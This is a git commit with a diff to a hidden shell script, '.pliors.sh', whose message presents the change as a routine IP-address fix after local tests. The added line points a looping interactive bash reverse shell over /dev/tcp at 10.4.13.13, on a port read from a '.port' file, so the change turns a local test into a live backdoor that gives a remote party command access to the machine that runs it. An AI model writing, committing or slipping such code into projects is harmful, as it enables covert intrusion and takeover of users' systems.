e7e2146d6e0985dffb8b2756c95f567f93d653cf
Fryy_55 <ivan_ugu55@icloud.com>
2025-10-21 20:49:33 +0500

    Fix the IP address used being 0.0.0.0 after local tests

--- .pliors.sh
+++ .pliors.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 for i in {1..6}; do
-    bash -i &> /dev/tcp/0.0.0.0/$(cat "$(dirname "$(readlink -f "$0")")/.port") 0>&1
+    bash -i &> /dev/tcp/10.4.13.13/$(cat "$(dirname "$(readlink -f "$0")")/.port") 0>&1
     sleep 10
 done
